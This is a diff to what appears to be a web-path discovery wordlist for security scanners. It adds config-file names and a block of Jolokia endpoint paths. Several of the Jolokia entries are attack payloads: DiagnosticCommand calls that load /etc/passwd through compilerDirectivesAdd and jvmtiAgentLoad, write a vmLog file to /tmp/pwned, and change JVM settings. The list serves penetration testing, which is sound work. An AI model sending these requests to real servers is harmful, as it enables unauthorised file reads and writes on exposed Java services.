@@ -4454,6 +4454,7 @@ config.ini
 config.ini.bak
 config.ini.old
 config.ini.txt
+config.js
 config.json
 config.json.cfm
 config.local
@@ -6038,6 +6039,20 @@ joinrequests.%EXT%
 jolokia
 jolokia/
 jolokia/list
+jolokia?p=/read/jboss.jmx:alias=jmx%2Frmi%2FRMIAdaptor/State
+jolokia/exec/java.lang:type=Memory/gc
+jolokia/list?maxObjects=100
+jolokia/read/java.lang:type=*/HeapMemoryUsage
+jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
+jolokia/search/*:j2eeType=J2EEServer,*
+jolokia/write/java.lang:type=Memory/Verbose/true
+jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
+jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
+jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
+jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
+jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
+jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
+jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
 joomla
 joomla.rar
 joomla.xml
@@ -6046,6 +6061,7 @@ joomla/
 joomla/administrator
 js
 js/
+js/config.js
 js/elfinder/elfinder.php
 js/envConfig.js
 js/FCKeditor
@@ -6237,6 +6253,7 @@ lk/
 load.php
 local
 local-cgi/
+localconfig
 local.config.rb
 local.properties
 local.xml.additional
